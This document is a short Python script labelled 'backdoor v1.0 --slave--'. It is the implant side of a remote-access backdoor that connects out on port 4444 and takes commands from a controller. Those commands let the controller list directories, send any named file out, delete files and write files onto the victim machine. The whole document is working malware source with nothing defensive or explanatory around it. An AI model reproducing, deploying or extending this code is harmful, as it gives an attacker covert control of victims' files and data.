#backdoor v1.0 --slave--
#command list:
#view_cwd : will show all files in the directory where file is running
#costum_dir : will move you to whatever directory you want
#download_file : will download the files from directory
import os
import socket
s=socket.socket()
port=4444
host=""
s.connect((host,port))
while 1:
	command=s.recv(1024)
	command=command.decode()
	if command == "view_cwd":
		files = os.getcwd()
		files = str(files)
		s.send(files.encode())
	elif command == "custom_dir":
		user_input=s.recv(5000)
		user_input=user_input.decode()
		files=os.listdir(user_input)
		files=str(files)
		s.send(files.encode())
	elif command == "download_file":
		file_path=s.recv(5000)
		file_path=file_path.decode()
		file=open(file_path, "rb")
		data=file.read()
		s.send(data)
	elif command == "remove_file":
		fileanddir=s.recv(6000)
		fileanddir=fileanddir.decode()
		os.remove(fileanddir)
	elif command == "send_file":
		filename=s.recv(6000)
		new_file=open(filename, "wb")
		data=s.recv(6000) #change when the file is big 
		new_file.write(data)
		new_file.close()
